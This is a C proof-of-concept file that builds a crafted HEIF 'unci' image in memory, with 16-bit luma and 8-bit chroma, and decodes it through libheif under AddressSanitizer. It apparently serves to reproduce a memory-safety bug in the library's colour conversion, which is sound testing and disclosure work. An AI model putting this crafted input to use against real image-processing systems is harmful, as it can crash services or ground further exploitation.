// PoC: decode an uncompressed ('unci') YCbCr 4:2:0 image whose luma plane is
// 16 bit while the Cb/Cr planes are 8 bit, to the 16-bit interleaved RGB
// target (heif_chroma_interleaved_RRGGBB_LE) through the public libheif API.
//
// The file is built in memory: single 'unci' item, mixed interleave,
// sampling_type 4:2:0, uncC component depths Y=16, Cb=8, Cr=8, nclx BT.601.
// 512x512 luma / 256x256 chroma.
//
// Note: if this process dies with "AddressSanitizer:DEADLYSIGNAL" before
// printing anything (no defect report), that is a known gcc-ASan/PIE startup
// shadow-mapping collision under ASLR on some kernels, not a finding; re-run.

#include <libheif/heif.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WIDTH 512u
#define HEIGHT 512u
#define CHROMA_WIDTH (WIDTH / 2)
#define CHROMA_HEIGHT (HEIGHT / 2)

// Make an AddressSanitizer finding abort (SIGABRT) rather than exit(1), so the
// report cannot be mistaken for an ordinary error return. handle_abort=0 keeps
// the runtime from re-intercepting that very SIGABRT (which recurses on some
// libsanitizer builds).
const char* __asan_default_options(void)
{
  return "abort_on_error=1:handle_abort=0";
}

typedef struct {
  uint8_t* p;
  size_t len;
  size_t cap;
} buf;

static void buf_free(buf* b)
{
  free(b->p);
  b->p = NULL;
  b->len = 0;
  b->cap = 0;
}

static void buf_put(buf* b, const void* d, size_t n)
{
  if (b->len + n > b->cap) {
    size_t ncap = b->cap ? b->cap * 2 : 256;
    while (ncap < b->len + n)
      ncap *= 2;
    b->p = (uint8_t*) realloc(b->p, ncap);
    if (!b->p) {
      fprintf(stderr, "out of memory\n");
      exit(1);
    }
    b->cap = ncap;
  }
  memcpy(b->p + b->len, d, n);
  b->len += n;
}

static void buf_u8(buf* b, uint8_t v) { buf_put(b, &v, 1); }

static void buf_u16be(buf* b, uint16_t v)
{
  uint8_t d[2] = {(uint8_t) (v >> 8), (uint8_t) v};
  buf_put(b, d, 2);
}

static void buf_u32be(buf* b, uint32_t v)
{
  uint8_t d[4] = {(uint8_t) (v >> 24), (uint8_t) (v >> 16), (uint8_t) (v >> 8), (uint8_t) v};
  buf_put(b, d, 4);
}

static void buf_fourcc(buf* b, const char* cc) { buf_put(b, cc, 4); }

static void buf_cstr(buf* b, const char* s) { buf_put(b, s, strlen(s) + 1); }

static void buf_buf(buf* b, const buf* o) { buf_put(b, o->p, o->len); }

// ISO BMFF box: u32 size + type + payload. When 'full' is set, a version byte
// and three flags bytes follow the type. Takes ownership of the payload.
static buf make_box(const char* type, buf* payload, int full, uint8_t version)
{
  buf b = {NULL, 0, 0};
  buf_u32be(&b, (uint32_t) (8 + (full ? 4 : 0) + payload->len));
  buf_fourcc(&b, type);
  if (full) {
    buf_u8(&b, version);
    buf_u8(&b, 0);
    buf_u8(&b, 0);
    buf_u8(&b, 0);
  }
  buf_buf(&b, payload);
  buf_free(payload);
  return b;
}

static buf build_heif_unci_ycbcr_mismatched_luma_depth(void)
{
  buf ftyp_payload = {NULL, 0, 0};
  buf_fourcc(&ftyp_payload, "mif1");
  buf_u32be(&ftyp_payload, 0);
  buf_fourcc(&ftyp_payload, "mif1");
  buf_fourcc(&ftyp_payload, "heic");
  buf ftyp = make_box("ftyp", &ftyp_payload, 0, 0);

  buf hdlr_payload = {NULL, 0, 0};
  buf_u32be(&hdlr_payload, 0);
  buf_fourcc(&hdlr_payload, "pict");
  buf_u32be(&hdlr_payload, 0);
  buf_u32be(&hdlr_payload, 0);
  buf_u32be(&hdlr_payload, 0);
  buf_u8(&hdlr_payload, 0);
  buf hdlr = make_box("hdlr", &hdlr_payload, 1, 0);

  buf pitm_payload = {NULL, 0, 0};
  buf_u16be(&pitm_payload, 1);
  buf pitm = make_box("pitm", &pitm_payload, 1, 0);

  // iinf: item 1 = 'unci'.
  buf infe_payload = {NULL, 0, 0};
  buf_u16be(&infe_payload, 1);
  buf_u16be(&infe_payload, 0);
  buf_fourcc(&infe_payload, "unci");
  buf_cstr(&infe_payload, "");
  buf infe = make_box("infe", &infe_payload, 1, 2);

  buf iinf_payload = {NULL, 0, 0};
  buf_u16be(&iinf_payload, 1);
  buf_buf(&iinf_payload, &infe);
  buf_free(&infe);
  buf iinf = make_box("iinf", &iinf_payload, 1, 0);

  // ispe
  buf ispe_payload = {NULL, 0, 0};
  buf_u32be(&ispe_payload, WIDTH);
  buf_u32be(&ispe_payload, HEIGHT);
  buf ispe = make_box("ispe", &ispe_payload, 1, 0);

  // cmpd: Y, Cb, Cr.
  buf cmpd_payload = {NULL, 0, 0};
  buf_u32be(&cmpd_payload, 3);
  buf_u16be(&cmpd_payload, 1); // Y
  buf_u16be(&cmpd_payload, 2); // Cb
  buf_u16be(&cmpd_payload, 3); // Cr
  buf cmpd = make_box("cmpd", &cmpd_payload, 0, 0);

  // uncC (v0): mixed interleave, 4:2:0, Y=16 bit, Cb=8 bit, Cr=8 bit.
  const uint8_t depths[3] = {16, 8, 8}; // Y, Cb, Cr
  buf uncC_payload = {NULL, 0, 0};
  buf_u32be(&uncC_payload, 0); // profile
  buf_u32be(&uncC_payload, 3); // component_count
  for (uint16_t idx = 0; idx < 3; idx++) {
    buf_u16be(&uncC_payload, idx);                  // component_index
    buf_u8(&uncC_payload, (uint8_t) (depths[idx] - 1)); // component_bit_depth_minus_one
    buf_u8(&uncC_payload, 0);                       // component_format (unsigned)
    buf_u8(&uncC_payload, 0);                       // component_align_size
  }
  buf_u8(&uncC_payload, 2);  // sampling_type = 4:2:0
  buf_u8(&uncC_payload, 2);  // interleave_type = mixed
  buf_u8(&uncC_payload, 0);  // block_size
  buf_u8(&uncC_payload, 0);  // flags (big-endian components)
  buf_u32be(&uncC_payload, 0); // pixel_size
  buf_u32be(&uncC_payload, 0); // row_align_size
  buf_u32be(&uncC_payload, 0); // tile_align_size
  buf_u32be(&uncC_payload, 0); // num_tile_cols_minus_one
  buf_u32be(&uncC_payload, 0); // num_tile_rows_minus_one
  buf uncC = make_box("uncC", &uncC_payload, 1, 0);

  // colr (nclx): BT.601 matrix so the YCbCr->RGB operators are candidates.
  buf colr_payload = {NULL, 0, 0};
  buf_fourcc(&colr_payload, "nclx");
  buf_u16be(&colr_payload, 6);  // colour_primaries (smpte170m)
  buf_u16be(&colr_payload, 6);  // transfer_characteristics (smpte170m)
  buf_u16be(&colr_payload, 6);  // matrix_coefficients (smpte170m / BT.601)
  buf_u8(&colr_payload, 0x80);  // full_range_flag = 1
  buf colr = make_box("colr", &colr_payload, 0, 0);

  buf ipco_payload = {NULL, 0, 0};
  buf_buf(&ipco_payload, &ispe);
  buf_buf(&ipco_payload, &cmpd);
  buf_buf(&ipco_payload, &uncC);
  buf_buf(&ipco_payload, &colr);
  buf_free(&ispe);
  buf_free(&cmpd);
  buf_free(&uncC);
  buf_free(&colr);
  buf ipco = make_box("ipco", &ipco_payload, 0, 0);

  buf ipma_payload = {NULL, 0, 0};
  buf_u32be(&ipma_payload, 1);  // entry_count
  buf_u16be(&ipma_payload, 1);  // item_ID 1
  buf_u8(&ipma_payload, 4);     // association_count
  buf_u8(&ipma_payload, 0x81);  // essential, ispe
  buf_u8(&ipma_payload, 0x82);  // essential, cmpd
  buf_u8(&ipma_payload, 0x83);  // essential, uncC
  buf_u8(&ipma_payload, 4);     // non-essential, colr
  buf ipma = make_box("ipma", &ipma_payload, 1, 0);

  buf iprp_payload = {NULL, 0, 0};
  buf_buf(&iprp_payload, &ipco);
  buf_buf(&iprp_payload, &ipma);
  buf_free(&ipco);
  buf_free(&ipma);
  buf iprp = make_box("iprp", &iprp_payload, 0, 0);

  // --- Tile data: Y plane (row-major, 2 bytes/sample, big-endian), followed by
  // the interleaved chroma block (Cb, Cr; 1 byte each per chroma position).
  buf tile_data = {NULL, 0, 0};
  for (uint32_t y = 0; y < HEIGHT; y++) {
    for (uint32_t x = 0; x < WIDTH; x++) {
      buf_u16be(&tile_data, (uint16_t) (0x1000 + x + WIDTH * y));
    }
  }
  for (uint32_t y = 0; y < CHROMA_HEIGHT; y++) {
    for (uint32_t x = 0; x < CHROMA_WIDTH; x++) {
      buf_u8(&tile_data, (uint8_t) (0x40 + y * CHROMA_WIDTH + x)); // Cb
      buf_u8(&tile_data, (uint8_t) (0x80 + y * CHROMA_WIDTH + x)); // Cr
    }
  }

  const uint32_t tile_len = (uint32_t) tile_data.len;
  buf idat = make_box("idat", &tile_data, 0, 0);

  // iloc (version 1): item 1 stored in idat (construction_method=1).
  buf iloc_payload = {NULL, 0, 0};
  buf_u16be(&iloc_payload, (4 << 12) | (4 << 8) | (0 << 4) | 0); // offset_size=4, length_size=4
  buf_u16be(&iloc_payload, 1); // item_count
  buf_u16be(&iloc_payload, 1); // item_ID
  buf_u16be(&iloc_payload, 0x0001); // construction_method=1 (idat)
  buf_u16be(&iloc_payload, 0); // data_reference_index
  buf_u16be(&iloc_payload, 1); // extent_count
  buf_u32be(&iloc_payload, 0); // extent_offset (within idat)
  buf_u32be(&iloc_payload, tile_len); // extent_length
  buf iloc = make_box("iloc", &iloc_payload, 1, 1);

  buf meta_payload = {NULL, 0, 0};
  buf_buf(&meta_payload, &hdlr);
  buf_buf(&meta_payload, &pitm);
  buf_buf(&meta_payload, &iinf);
  buf_buf(&meta_payload, &iprp);
  buf_buf(&meta_payload, &iloc);
  buf_buf(&meta_payload, &idat);
  buf_free(&hdlr);
  buf_free(&pitm);
  buf_free(&iinf);
  buf_free(&iprp);
  buf_free(&iloc);
  buf_free(&idat);
  buf meta = make_box("meta", &meta_payload, 1, 0);

  buf file = {NULL, 0, 0};
  buf_buf(&file, &ftyp);
  buf_buf(&file, &meta);
  buf_free(&ftyp);
  buf_free(&meta);
  return file;
}

int main(void)
{
  buf file = build_heif_unci_ycbcr_mismatched_luma_depth();

  heif_context* ctx = heif_context_alloc();
  if (!ctx) {
    fprintf(stderr, "heif_context_alloc failed\n");
    return 1;
  }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, file.p, file.len, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "read failed (%d/%d): %s\n", err.code, err.subcode, err.message);
    return 1;
  }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok || !handle) {
    fprintf(stderr, "no primary image (%d/%d): %s\n", err.code, err.subcode, err.message);
    return 1;
  }

  fprintf(stderr, "primary image: %dx%d\n", heif_image_handle_get_width(handle),
         heif_image_handle_get_height(handle));

  // Convert the YCbCr 4:2:0 image with 16-bit luma / 8-bit chroma to 16-bit
  // interleaved RGB.
  heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_RGB, heif_chroma_interleaved_RRGGBB_LE, NULL);
  fprintf(stderr, "decode: code=%d subcode=%d message=%s\n", err.code, err.subcode, err.message);

  if (img) {
    size_t stride = 0;
    const uint8_t* plane = heif_image_get_plane_readonly2(img, heif_channel_interleaved, &stride);
    fprintf(stderr, "decoded plane: %p stride=%zu, first bytes %02x %02x %02x %02x\n",
           (const void*) plane, stride, plane[0], plane[1], plane[2], plane[3]);
    heif_image_release(img);
  }

  heif_image_handle_release(handle);
  heif_context_free(ctx);
  buf_free(&file);
  return 0;
}
